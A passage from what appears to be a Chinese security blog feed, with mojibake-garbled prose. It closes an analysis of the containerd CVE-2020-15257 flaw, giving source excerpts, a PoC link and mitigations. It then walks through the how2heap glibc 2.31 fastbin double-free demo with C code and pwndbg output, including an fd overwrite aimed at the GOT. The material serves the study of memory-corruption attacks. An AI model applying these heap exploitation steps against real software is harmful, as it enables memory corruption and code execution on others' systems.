&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bundle, err := newBundle(id,</span><br><span class="line">filepath.Join(r.state, namespace),</span><br><span class="line">filepath.Join(r.root, namespace),</span><br><span class="line">opts.Spec.Value)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">bundle.Delete()</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">shimopt := ShimLocal(r.config, r.events)</span><br><span class="line"><span class="keyword">if</span> !r.config.NoShim &#123;</span><br><span class="line"><span class="keyword">var</span> cgroup <span class="keyword">string</span></span><br><span class="line"><span class="keyword">if</span> opts.TaskOptions != <span class="literal">nil</span> &#123;</span><br><span class="line">v, err := typeurl.UnmarshalAny(opts.TaskOptions)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">cgroup = v.(*runctypes.CreateOptions).ShimCgroup</span><br><span class="line">&#125;</span><br><span class="line">exitHandler := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">log.G(ctx).WithField(<span class="string">&quot;id&quot;</span>, id).Info(<span class="string">&quot;shim reaped&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> _, err := r.tasks.Get(ctx, id); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Task was never started or was already successfully deleted</span></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err = r.cleanupAfterDeadShim(context.Background(), bundle, namespace, id); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.G(ctx).WithError(err).WithFields(logrus.Fields&#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>:        id,</span><br><span class="line"><span class="string">&quot;namespace&quot;</span>: namespace,</span><br><span class="line">&#125;).Warn(<span class="string">&quot;failed to clean up after killed shim&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">shimopt = ShimRemote(r.config, r.address, cgroup, exitHandler)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚è¿™æ ·çš„æ“ä½œ</p><p>æ›´å¤šçš„äº¤äº’æ“ä½œå¯ä»¥å‚è€ƒ å¼ ä¸€ç™½çš„ <a href="https://github.com/summershrimp/exploits-open/blob/9f2e0a28ffcf04ac81ce9113b2f8c451c36fe129/CVE-2020-15257/main.go">PoC</a></p><p>è‡³äºå…·ä½“çš„åˆ©ç”¨ï¼Œåœ¨è¿™é‡Œå°±ä¸è¿›è¡Œç»†èŠ‚æ¢è®¨äº†ï¼Œå¯ä»¥ç”±è¯»è€…è‡ªè¡Œå®Œæˆã€‚æœ€åæ”¾ä¸€ä¸ªæˆ‘çš„åˆ©ç”¨è§†é¢‘</p><iframe src="//player.bilibili.com/player.html?aid=800507748&bvid=BV1my4y1q7oe&cid=262892226&page=1&high_quality=1&danmaku=0"allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe<p>å¦å¤–æ¬¢è¿å¤§å®¶å…³æ³¨æˆ‘çš„æ¨ç‰¹ï¼š <a href="https://twitter.com/bestswngs/status/1334867563914915840">https://twitter.com/bestswngs/status/1334867563914915840</a></p><h3 id="å®‰å…¨å»ºè®®"><a href="#å®‰å…¨å»ºè®®" class="headerlink" title="å®‰å…¨å»ºè®®"></a>å®‰å…¨å»ºè®®</h3><ol><li><p>å‡çº§ containerd è‡³æœ€æ–°ç‰ˆæœ¬ã€‚</p></li><li><p>é€šè¿‡æ·»åŠ å¦‚ deny unix addr=@**çš„AppArmorç­–ç•¥ç¦æ­¢è®¿é—®æŠ½è±¡å¥—æ¥å­—ã€‚</p></li></ol><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="https://www.chainnews.com/articles/937146786717.htm">https://www.chainnews.com/articles/937146786717.htm</a><br><a href="https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4">https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-15257 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Educational Heap Exploitation 2.0 (how2heap glibc 2.31)</title>
      <link href="Education_Heap_Exploit_glibc_2.31.html"/>
      <url>Education_Heap_Exploit_glibc_2.31.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="how2heap-glibc-2-31"><a href="#how2heap-glibc-2-31" class="headerlink" title="how2heap glibc 2.31"></a>how2heap glibc 2.31</h2><p>å‰å‡ å¤© how2heap æ›´æ–°äº†ï¼Œå°†ä¸»ä»“åº“åˆ’åˆ†æˆäº† 2.23 ã€2.27 ä»¥åŠ 2.31 ä¸‰ä¸ªåˆ†ç±»ï¼Œè¿™é‡Œæˆ‘ä»¬æ¥å¤ä¹ ï¼ˆå­¦ä¹ ï¼‰ ä¸€ä¸‹ glibc 2.31 ä¸‹çš„ä¸€äº› heap exploit</p><h3 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h3><p>å…³äº fastbin attack åœ¨glibc 2.31 ä¸Šæ²¡æœ‰ä»€ä¹ˆå˜åŒ–, è¿™é‡Œç»™çš„æ ·ä¾‹æ˜¯é€šè¿‡ double-attack æ¼æ´ä¿®æ”¹ æ„é€ ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ª chunk çš„æƒ…æ™¯ã€‚</p><p>ç¨‹åºé¦–å…ˆ malloc äº† 8 æ¬¡, ç„¶å free äº†7æ¬¡ï¼ˆç”¨æ¥å¡«å…… tcache binsï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ tcachebins å·²ç»å¡«æ»¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">7</span>]: <span class="number">0x555555559360</span> â€”â–¸ <span class="number">0x555555559340</span> â€”â–¸ <span class="number">0x555555559320</span> â€”â–¸ <span class="number">0x555555559300</span> â€”â–¸ <span class="number">0x5555555592e0</span> â€”â–¸ <span class="number">0x5555555592c0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åç”¨ calloc åˆ†é… 3 ä¸ªchunk ï¼Œ ä½¿ç”¨ calloc åˆ†é…çš„æ—¶å€™ï¼Œæ­¤æ—¶ä¸ä¼šä» tcachebins æ‹¿å·²ç» free çš„ chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">20</span> <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">  <span class="number">21</span> <span class="keyword">int</span> *a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="number">22</span> <span class="keyword">int</span> *b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">â–º <span class="number">23</span> <span class="keyword">int</span> *c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">  <span class="number">24</span></span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œ double free æ“ä½œå³ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æˆ‘ä»¬æ³¨æ„åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  7]: 0x555555559360 â€”â–¸ 0x555555559340 â€”â–¸ 0x555555559320 â€”â–¸ 0x555555559300 â€”â–¸ 0x5555555592e0 â€”â–¸ 0x5555555592c0 â€”â–¸ 0x5555555592a0 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555555559390 â€”â–¸ 0x5555555593b0 â—‚â€” 0x555555559390</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å­˜åœ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">         +----------------------------+</span><br><span class="line">         |                            |</span><br><span class="line">+--------+--------+          +--------+--------+</span><br><span class="line">|                 |          |                 |</span><br><span class="line">|      chunk a    |  +----&gt;  |      chunk b    |</span><br><span class="line">|                 |          |                 |</span><br><span class="line">+-----------------+          +-----------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>chunk a æŒ‡å‘ chunk b ï¼ŒåŒæ—¶ chunk b ä¹ŸæŒ‡å‘äº† chunk a</p><p>ç„¶åå¦‚æœæˆ‘ä»¬å†æŠŠä»–ä»¬å å›æ¥ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_dup.c</span><br><span class="line">   <span class="number">40</span></span><br><span class="line">   <span class="number">41</span> <span class="built_in">printf</span>(<span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">   <span class="number">42</span> a = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">   <span class="number">43</span> b = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">   <span class="number">44</span> c = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line"> â–º <span class="number">45</span> <span class="built_in">printf</span>(<span class="string">&quot;1st calloc(1, 8): %p\n&quot;</span>, a);</span><br><span class="line">   <span class="number">46</span> <span class="built_in">printf</span>(<span class="string">&quot;2nd calloc(1, 8): %p\n&quot;</span>, b);</span><br><span class="line">   <span class="number">47</span> <span class="built_in">printf</span>(<span class="string">&quot;3rd calloc(1, 8): %p\n&quot;</span>, c);</span><br><span class="line">   <span class="number">48</span></span><br><span class="line">   <span class="number">49</span> assert(a == c);</span><br><span class="line">   <span class="number">50</span> &#125;</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7fffffffe230</span> â—‚â€” <span class="number">0x700000008</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x7fffffffe238</span> â€”â–¸ <span class="number">0x5555555593a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fffffffe240</span> â€”â–¸ <span class="number">0x5555555593c0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fffffffe248</span> â€”â–¸ <span class="number">0x5555555593a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7fffffffe250</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚      <span class="number">0x7fffffffe258</span> â€”â–¸ <span class="number">0x5555555592c0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚      <span class="number">0x7fffffffe260</span> â€”â–¸ <span class="number">0x5555555592e0</span> â€”â–¸ <span class="number">0x5555555592c0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x7fffffffe268</span> â€”â–¸ <span class="number">0x555555559300</span> â€”â–¸ <span class="number">0x5555555592e0</span> â€”â–¸ <span class="number">0x5555555592c0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” ...</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">555555555428</span> main+<span class="number">511</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">16</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593a0</span></span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">17</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593c0</span></span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">int</span> *) <span class="number">0x5555555593a0</span></span><br></pre></td></tr></table></figure><p>å°±ä¼šå­˜åœ¨ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å— chunkï¼Œé€šå¸¸è€Œè¨€æˆ‘ä»¬çš„ä¸‹ä¸€æ­¥åˆ©ç”¨ä¼šæ‰¾ä¸€ä¸ª size ç¬¦åˆå½“å‰fastbin é“¾çš„åœ°å€ï¼ˆ_int_malloc ä¼šå¯¹æ¬²åˆ†é…ä½ç½®çš„ size åŸŸè¿›è¡ŒéªŒè¯ï¼Œå¦‚æœå…¶ size ä¸å½“å‰ fastbin é“¾è¡¨åº”æœ‰ size ä¸ç¬¦å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ï¼‰ï¼Œç„¶ååœ¨åˆ†é…å‡º chunk a çš„åŒæ—¶ä¿®æ”¹ chunk a çš„ fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5555555593a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rax r8  <span class="number">0x5555555593a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚         <span class="number">0x5555555593b8</span> â—‚â€” <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚         <span class="number">0x5555555593c0</span> â€”â–¸ <span class="number">0x555555559390</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚         <span class="number">0x5555555593c8</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚         <span class="number">0x5555555593d8</span> â—‚â€” <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"></span><br><span class="line">## ä¿®æ”¹ fd</span><br><span class="line"><span class="built_in">set</span> *<span class="number">0x5555555593c0</span>=<span class="number">0x555555557f78</span></span><br><span class="line">## è®¾ç½®size ç¬¦åˆ fastbiné“¾</span><br><span class="line"><span class="built_in">set</span> *<span class="number">0x555555557f80</span>=<span class="number">0x21</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555593c0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚   <span class="number">0x5555555593c0</span> â€”â–¸ <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚   <span class="number">0x5555555593c8</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚   <span class="number">0x5555555593d8</span> â—‚â€” <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚   <span class="number">0x5555555593e0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚   <span class="number">0x5555555593f8</span> â—‚â€” <span class="number">0x20c11</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x555555557f78</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚   <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚   <span class="number">0x555555557f80</span> (_GLOBAL_OFFSET_TABLE_) â—‚â€” <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶fastbin é“¾çš„ç»“æ„å°±ä¼šè¢«ä¿®æ”¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">7</span>]: <span class="number">0x555555559360</span> â€”â–¸ <span class="number">0x555555559340</span> â€”â–¸ <span class="number">0x555555559320</span> â€”â–¸ <span class="number">0x555555559300</span> â€”â–¸ <span class="number">0x5555555592e0</span> â€”â–¸ <span class="number">0x5555555592c0</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x5555555593b0</span> â€”â–¸ <span class="number">0x555555557f78</span> (_DYNAMIC+<span class="number">488</span>) â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br></pre></td></tr></table></figure><p>å½“æ‰§è¡Œåˆ° åˆ†é… c chunk çš„æ—¶å€™ ï¼Œæˆ‘ä»¬å°±ä¼šæ‹¿åˆ°ç›®æ ‡å†…å­˜ï¼Œæ€»ç»“ä¸€ä¸‹å°±æ˜¯</p><p>é€šè¿‡ fastbin double free æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šä¸ªæŒ‡é’ˆæ§åˆ¶åŒä¸€ä¸ªå †å—ï¼Œè¿™å¯ä»¥ç”¨äºç¯¡æ”¹ä¸€äº›å †å—ä¸­çš„å…³é”®æ•°æ®åŸŸæˆ–è€…æ˜¯å®ç°ç±»ä¼¼äºç±»å‹æ··æ·†çš„æ•ˆæœã€‚ å¦‚æœæ›´è¿›ä¸€æ­¥ä¿®æ”¹ fd æŒ‡é’ˆï¼Œåˆ™èƒ½å¤Ÿå®ç°ä»»æ„åœ°å€åˆ†é…å †å—çš„æ•ˆæœ (é¦–å…ˆè¦é€šè¿‡éªŒè¯)ï¼Œè¿™å°±ç›¸å½“äºä»»æ„åœ°å€å†™ä»»æ„å€¼çš„æ•ˆæœã€‚</p><p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache first.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">void</span> *ptrs[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++) &#123;</span><br><span class="line">                ptrs[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) &#123;</span><br><span class="line">                <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> *a = <span 